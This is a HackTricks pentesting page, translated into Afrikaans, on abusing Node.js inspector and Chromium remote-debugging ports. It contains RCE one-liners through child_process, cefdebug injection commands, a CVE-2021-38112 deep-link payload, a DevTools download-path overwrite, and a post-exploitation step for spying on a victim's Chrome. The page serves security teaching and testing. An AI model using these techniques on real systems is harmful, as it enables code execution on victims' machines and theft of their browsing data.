# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

[Volgens die docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wanneer dit met die `--inspect`-switch gestart word, luister ’n Node.js-proses vir ’n debugging client. By **verstek** sal dit by host en port **`127.0.0.1:9229`** luister. Elke proses kry ook ’n **unieke** **UUID** toegeken.

Inspector clients moet die host address, port en UUID ken en spesifiseer om te verbind. ’n Volledige URL sal ongeveer soos volg lyk: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Omdat die **debugger volle toegang tot die Node.js execution environment het**, kan ’n malicious actor wat aan hierdie port kan verbind, moontlik arbitrary code namens die Node.js-proses uitvoer (**potential privilege escalation**).

Daar is verskeie maniere om ’n inspector te start:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wanneer jy ’n geïnspekteerde proses begin, sal iets soos die volgende verskyn:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prosesse gebaseer op **CEF** (**Chromium Embedded Framework**) moet die parameter `--remote-debugging-port=9222` gebruik om die **debugger** oop te maak (die SSRF-beskermings bly baie soortgelyk). Hulle sal egter, **in plaas daarvan** om ’n **NodeJS** **debug**-sessie toe te staan, met die blaaier kommunikeer deur die [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), wat ’n koppelvlak is om die blaaier te beheer, maar daar is nie ’n direkte RCE nie.

Wanneer jy ’n browser met **debug** begin, sal iets soos die volgende verskyn:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Blaaiers, WebSockets en same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webwerwe wat in ’n webblaaier oopgemaak word, kan WebSocket- en HTTP-versoeke binne die blaaier se sekuriteitsmodel maak. ’n **Aanvanklike HTTP-verbinding** is nodig om ’n **unieke debugger-sessie-ID te verkry**. Die **same-origin-policy** **verhoed** dat webwerwe **hierdie HTTP-verbinding** kan maak. Vir bykomende sekuriteit teen [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** verifieer Node.js dat die **'Host'-headers** vir die verbinding óf ’n **IP-adres** óf **`localhost`** óf **`localhost6`** presies spesifiseer.

> [!TIP]
> Hierdie **sekuriteitsmaatreëls verhoed dat die inspector uitgebuit word** om kode uit te voer deur **net ’n HTTP-versoek te stuur** (wat gedoen kan word deur ’n SSRF-vuln. uit te buit).

### Begin inspector in lopende prosesse

Jy kan die **sein SIGUSR1** na ’n lopende nodejs-proses stuur om dit die **inspector** op die verstekpoort te laat **begin**. Let egter daarop dat jy voldoende voorregte moet hê, dus kan dit jou **bevoorregte toegang tot inligting binne die proses** gee, maar nie ’n direkte privilege escalation nie.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Dit is nuttig in containers omdat **die afskakeling van die proses en die begin van ’n nuwe een** met `--inspect` **nie ’n opsie is nie**, want die **container** sal saam met die proses **gestop** word.

### Koppel aan inspector/debugger

Om aan ’n **Chromium-gebaseerde blaaier** te koppel, kan die `chrome://inspect`- of `edge://inspect`-URL’s onderskeidelik vir Chrome of Edge verkry word. Deur op die Configure-knoppie te klik, moet verseker word dat die **teikengasheer en -poort** korrek gelys is. Die beeld wys ’n Remote Code Execution (RCE)-voorbeeld:

![Nadat ’n URL om toegang tot die debugger te verkry sal verskyn, bv. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Koppel aan inspector/debugger: Om aan ’n Chromium-gebaseerde blaaier te koppel, ...](<../../images/image (674).png>)

Met die **command line** kan jy met ’n debugger/inspector koppel deur:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Die hulpmiddel [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) laat jou toe om **inspectors** te vind wat plaaslik loop en kode daarin te **inject**.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Let daarop dat **NodeJS RCE exploits nie sal werk nie** indien dit via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) aan ’n browser gekoppel is (jy moet die API nagaan om interessante dinge te vind wat jy daarmee kan doen).

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Indien jy hier beland het omdat jy wil uitvind hoe om [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html) te verkry.

Sommige algemene maniere om **RCE** te verkry wanneer jy aan ’n Node **inspector** kan **connect**, is om iets soos die volgende te gebruik (dit lyk asof dit **nie sal werk met ’n verbinding met Chrome DevTools protocol nie**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Jy kan die API hier nagaan: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In hierdie afdeling sal ek bloot interessante dinge lys wat ek gevind het wat mense gebruik het om hierdie protocol te exploit.

### Parameter Injection via Deep Links

In die [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) het Rhino security ontdek dat ’n toepassing gebaseer op CEF ’n custom UR**I in die stelsel geregistreer het (workspaces://index.html) wat die volledige URI ontvang het en daarna die CEF-gebaseerde applicatio**n geloods het met ’n konfigurasie wat gedeeltelik uit daardie URI saamgestel is.

Daar is ontdek dat die URI-parameters URL decoded is en gebruik is om die CEF-basiese toepassing te loods, wat ’n gebruiker toegelaat het om die flag **`--gpu-launcher`** in die **command line** te **inject** en arbitrêre dinge uit te voer.

Dus, ’n payload soos:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Sal 'n calc.exe uitvoer.

### Oorskryf lêers

Verander die vouer waar **afgelaaide lêers gestoor gaan word** en laai 'n lêer af om die gereeld gebruikte **source code** van die toepassing met jou **malicious code** te **oorskryf**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE en exfiltration

Volgens hierdie plasing: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) is dit moontlik om RCE te verkry en interne bladsye vanaf theriver te exfiltreer.

### Post-Exploitation

In ’n werklike omgewing en **nadat jy** ’n gebruiker se rekenaar wat ’n Chrome/Chromium-gebaseerde blaaier gebruik, **gekompromitteer het**, kan jy ’n Chrome-proses met die **debugging geaktiveer en die debugging-poort geport-forward** begin sodat jy toegang daartoe kan verkry. Op hierdie manier sal jy **alles wat die slagoffer met Chrome doen, kan inspekteer en sensitiewe inligting kan steel**.

Die stealth-manier is om **elke Chrome-proses te beëindig** en dan iets soos die volgende aan te roep
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Verwysings

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
